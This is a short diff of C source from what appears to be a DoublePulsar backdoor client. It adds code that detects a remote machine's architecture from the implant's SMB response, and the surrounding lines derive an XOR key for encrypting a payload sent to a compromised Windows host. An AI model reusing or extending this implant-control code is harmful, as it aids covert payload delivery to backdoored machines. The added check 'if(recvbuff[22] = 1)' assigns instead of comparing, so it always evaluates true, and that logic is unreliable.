@@ -249,9 +249,16 @@ int main(int argc, char* argv[])
 	memcpy(smb_signature + 1, (unsigned int*)&recvbuff + 19, 1);
 	memcpy(smb_signature + 2, (unsigned int*)&recvbuff + 20, 1);
 	memcpy(smb_signature + 3, (unsigned int*)&recvbuff + 21, 1);
+	//get Architecture of remote computer via Doublepulsar response
+	BOOL is64bit;
+	if(recvbuff[22] = 1)
+	{
+		is64bit = TRUE;
+		printf("Arch is 64 bit!\n");
+	}
 	*/
 	
-	//test SMB signature
+	//Example SMB signature
 	unsigned int signature[] = { 0x3a, 0x10, 0xe0, 0x36 };
 	//Generate the doublepulsar XOR key from the SMB trans2 response signature
 	//This XOR key will be used to encrypt the payload buffer
